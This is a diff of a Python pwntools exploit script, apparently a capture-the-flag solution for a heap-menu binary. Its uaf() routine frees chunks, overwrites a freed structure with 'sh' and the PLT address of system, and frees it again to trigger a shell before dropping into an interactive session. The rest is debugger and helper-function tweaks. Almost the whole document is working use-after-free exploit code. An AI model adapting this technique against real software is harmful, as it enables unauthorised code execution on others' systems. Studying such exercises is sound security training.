@@ -10,7 +10,7 @@ context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
 
 def debug():
     raw_input("DEBUG: ")
-    gdb.attach(io, "set follow-fork-mode parent\nb *main")
+    gdb.attach(io, "set follow-fork-mode parent\n")
 
 
 if sys.argv[1] == "r":
@@ -27,10 +27,7 @@ def New(idx, kind, value, length = 0):
     io.sendlineafter("Type > ", str(kind))
     if kind == 2:
         io.sendlineafter("Length > ", str(length))
-        io.sendlineafter("Value > ", value)
-        
-    else:
-        io.sendlineafter("Value > ", str(value))
+    io.sendlineafter("Value > ", str(value))
 
 def Del(idx):
     io.sendlineafter("Act > ", "2")
@@ -48,11 +45,14 @@ def uaf():
     Del(1)
 
     New(2, 2, ("sh\x00\x00" + p32(elf.plt["system"])), 10)
-    #  New(3, 2, ("sh\x00\x00" + p32(elf.plt["system"])), 10)
+    #  New(2, 2, (p32(elf.plt["system"]) + "sh\x00\x00"), 10)
 
+    #  debug()
     Del(0)
+    #  Show(0)
 
 if __name__ == "__main__":
+    #  debug()
     uaf()
     io.interactive()
     io.close()
